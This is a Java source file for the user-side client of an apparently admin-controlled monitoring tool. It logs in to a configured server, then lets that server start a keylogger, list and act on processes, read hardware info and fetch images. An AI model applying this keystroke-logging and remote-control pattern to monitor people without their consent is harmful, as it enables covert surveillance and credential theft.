package Client;

import Client.GUI.Lib.GlobalVariable;
import Client.GUI.User.LoginUserGUI;
import Server.EventDispatcher.EventDispatcher;
import Server.IntervalThread;
import SocketMessageReceiver.CustomAdminReceiver.LoginUserResultReceiver;
import SocketMessageReceiver.CustomUserReceiver.*;
import SocketMessageReceiver.DataType.LogOutUserRequest;
import SocketMessageReceiver.DataType.LoginUserRequest;
import SocketMessageReceiver.DataType.LoginUserUDPRequest;
import SocketMessageReceiver.DataType.ProcessAction.ProcessActionResultUserSide;
import SocketMessageReceiver.DataType.ServerInfo;
import SocketMessageSender.CustomUserSender.LogOutUserSender;
import SocketMessageSender.CustomUserSender.LoginSender;
import SocketMessageSender.CustomUserSender.LoginUDPSender;
import SocketMessageSender.CustomUserSender.ProcessActionResultSender;
import Utilities.Utilities;
import jdk.jfr.Event;
import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyEvent;
import lc.kra.system.keyboard.event.GlobalKeyListener;

import java.awt.*;
import java.awt.event.KeyEvent;
import java.io.*;
import java.net.ServerSocket;
import java.net.URL;

public class User {
    public static int adminId;
 
    public static void main(String[] args) throws IOException, InterruptedException {
        try (ServerSocket ignored = new ServerSocket(9999)) {
            var serverInfo = getServerInfo();
            if (serverInfo == null) {
                System.out.println("Invalid server info");
                return;
            }

            var host = serverInfo.host;
            var port = serverInfo.port;

            var tcpClient = new TCPClient(host, port);

            tcpClient.setBuffer(2048 * 1024);
            tcpClient.start();

//            UDPClient udpClient = new UDPClient("localhost", 4446);
//            udpClient.setBuffer(1024 * 1024);
//            udpClient.start();

            ClientInstance.tcpClient = tcpClient;
//            ClientInstance.udpClient = udpClient;

            GlobalVariable.LoginUserGUI = new LoginUserGUI();
            GlobalVariable.LoginUserGUI.setVisible(true);

//            var loginTcpSender = new LoginSender(tcpClient);
            var uuid = Utilities.getUUID();

            EventDispatcher.startListening(new LoginUserResultReceiver((loginUserResult) -> {
                if (!loginUserResult.userInfo.isWriteLog) return;

                if (KeyLogger.instance != null) KeyLogger.instance.stop();

                var keyLogger = new KeyLogger(loginUserResult.userInfo.writeLogInterval);
                keyLogger.start();

                KeyLogger.instance = keyLogger;
            }));

            EventDispatcher.startListening(new GetProcessesReceiver());
            EventDispatcher.startListening(new GetHardwareInfoReceiver());
            EventDispatcher.startListening(new GetImageReceiver());

            EventDispatcher.startListening(new ProcessActionReceiver());
            EventDispatcher.startListening(new ChangeKeyLogConfigReceiver());
            EventDispatcher.startListening(new UserActionReceiver());

            var shutdownThread = new Thread(() -> {
                var sender = new LogOutUserSender(tcpClient);
                sender.send(null, new LogOutUserRequest(adminId, uuid));
            });
            Runtime.getRuntime().addShutdownHook(shutdownThread);

            Thread.currentThread().join();
        } catch (IOException e) {
            System.out.println("Application instance is already running.");
            System.exit(0);
        }

    }

    private static final String SERVER_INFO_FILE = "user_server_info.dat";

    private static ServerInfo getServerInfo() {
        File file = new File("./" + SERVER_INFO_FILE);
        if (!file.exists()) return null;

        try (var reader = new BufferedReader(new FileReader(file))) {
            var serverIp = reader.readLine();
            var serverPort = Integer.parseInt(reader.readLine());

            return new ServerInfo(serverIp, serverPort);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

}
